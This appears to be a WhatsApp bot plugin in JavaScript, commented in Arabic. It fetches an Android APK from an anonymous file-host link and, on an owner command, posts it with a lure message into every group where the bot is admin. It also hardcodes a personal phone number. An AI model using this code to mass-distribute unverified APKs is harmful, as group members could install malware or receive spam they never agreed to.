import fetch from 'node-fetch';
import { fileTypeFromBuffer } from 'file-type';

// إعدادات البوت
const APP_LINK = 'https://files.catbox.moe/bem1wd.apk'; // رابط التطبيق من catbox
const CUSTOM_MESSAGE = '*السلام عليكم الإخوان 👋❤️، مهم هدا هو التطبيق للناس جداد بصحتكم 🤩✅*'; // النص المخصص
const OWNER_NUMBER = '212776537766@s.whatsapp.net'; // رقمك مع البادئة
const FILE_NAME = 'FOOT LIVE.apk'; // اسم الملف الثابت

let handler = async (m, { conn, command, text, args, usedPrefix }) => {
  // أمر الإرسال العادي
  if (command === 'send') {
    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    
    try {
      // تحميل الملف أولاً
      const { buffer, mimetype } = await downloadFile(APP_LINK);
      
      // إرسال الرسالة مرة واحدة فقط قبل التطبيق
      await conn.reply(m.chat, CUSTOM_MESSAGE, m);
      
      // انتظر ثانية واحدة ثم أرسل الملف بدون نص
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // إرسال الملف مع الاسم المخصص فقط
      await conn.sendMessage(
        m.chat,
        {
          document: buffer,
          fileName: FILE_NAME,
          mimetype: mimetype
          // بدون caption
        },
        { quoted: m }
      );
      
    } catch (e) {
      console.error(e);
      await conn.reply(m.chat, '❌ حدث خطأ أثناء إرسال التطبيق.', m);
    }
  }
  
  // أمر إرسال إلى جميع المجموعات (للمسؤول فقط)
  else if (command === 'sendall') {
    // التحقق إذا كان مرسل الرسالة هو المسؤول
    const isOwner = m.sender === OWNER_NUMBER;
    
    if (!isOwner) {
      return await conn.reply(m.chat, '❌ هذا الأمر للمسؤول فقط!', m);
    }
    
    await conn.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });
    await conn.reply(m.chat, '🔄 جاري الإرسال إلى جميع المجموعات...', m);
    
    try {
      // تحميل الملف مرة واحدة فقط
      const { buffer, mimetype } = await downloadFile(APP_LINK);
      
      const chats = await conn.groupFetchAllParticipating();
      const groups = Object.values(chats).filter(chat => chat.id.endsWith('@g.us'));
      
      let successCount = 0;
      let failCount = 0;
      let notAdminCount = 0;
      
      for (const group of groups) {
        try {
          // التحقق إذا كان البوت أدمن في المجموعة
          const groupMetadata = await conn.groupMetadata(group.id);
          const botParticipant = groupMetadata.participants.find(p => p.id === conn.user.jid);
          
          if (botParticipant && botParticipant.admin) {
            // إرسال الرسالة مرة واحدة فقط
            await conn.sendMessage(group.id, { text: CUSTOM_MESSAGE });
            
            // انتظر قليلاً
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // إرسال الملف بدون نص
            await conn.sendMessage(
              group.id,
              {
                document: buffer,
                fileName: FILE_NAME,
                mimetype: mimetype
                // بدون caption
              }
            );
            
            successCount++;
            console.log(`✅ تم الإرسال إلى: ${group.subject || group.id}`);
            
            // انتظر بين كل إرسال
            await new Promise(resolve => setTimeout(resolve, 4000));
            
          } else {
            notAdminCount++;
            console.log(`⏭️ البوت ليس أدمن في: ${group.subject || group.id}`);
          }
        } catch (err) {
          failCount++;
          console.error(`❌ فشل الإرسال إلى ${group.id}:`, err.message);
        }
      }
      
      await conn.reply(
        m.chat,
        `📊 *تقرير الإرسال*\n\n✅ نجح: ${successCount}\n❌ فشل: ${failCount}\n👑 ليس أدمن: ${notAdminCount}\n🎯 إجمالي المجموعات: ${groups.length}`,
        m
      );
      
    } catch (e) {
      console.error(e);
      await conn.reply(m.chat, '❌ حدث خطأ أثناء الإرسال الجماعي.', m);
    }
  }
  
  // أمر للمساعدة
  else if (command === 'sendhelp') {
    const helpText = `🎯 *أوامر البوت:*\n\n` +
      `*${usedPrefix}send* - إرسال التطبيق في هذه المجموعة\n` +
      `*${usedPrefix}sendall* - إرسال التطبيق لكل المجموعات (للمالك فقط)\n` +
      `*${usedPrefix}sendhelp* - عرض هذه المساعدة\n\n` +
      `📱 *اسم الملف:* ${FILE_NAME}\n` +
      `👤 *المالك:* ${OWNER_NUMBER.replace('@s.whatsapp.net', '')}`;
    
    await conn.reply(m.chat, helpText, m);
  }
};

// تعريف الأوامر
handler.command = /^(send|sendall|sendhelp)$/i;
handler.help = [
  'send - إرسال التطبيق في المجموعة',
  'sendall - إرسال لكل المجموعات (للمالك)',
  'sendhelp - المساعدة'
];
handler.tags = ['tools'];

// صلاحيات الأوامر
handler.admin = false;
handler.owner = true;

export default handler;

// === الدوال المساعدة ===

async function downloadFile(url) {
  try {
    console.log(`📥 جاري تحميل الملف من: ${url}`);
    
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`خطأ HTTP! الحالة: ${response.status}`);
    }
    
    const buffer = await response.arrayBuffer();
    const nodeBuffer = Buffer.from(buffer);
    
    // تحديد نوع الملف
    let fileType;
    try {
      fileType = await fileTypeFromBuffer(nodeBuffer);
    } catch (e) {
      console.log('⚠️ لا يمكن تحديد نوع الملف، استخدام نوع افتراضي');
    }
    
    // حجم الملف
    const sizeMB = (nodeBuffer.length / 1024 / 1024).toFixed(2);
    console.log(`✅ تم تحميل الملف: ${FILE_NAME} (${sizeMB} MB)`);
    
    return {
      buffer: nodeBuffer,
      fileName: FILE_NAME,
      mimetype: fileType?.mime || 'application/vnd.android.package-archive',
      size: nodeBuffer.length
    };
    
  } catch (error) {
    console.error('خطأ في تحميل الملف:', error);
    throw new Error(`فشل تحميل الملف: ${error.message}`);
  }
}
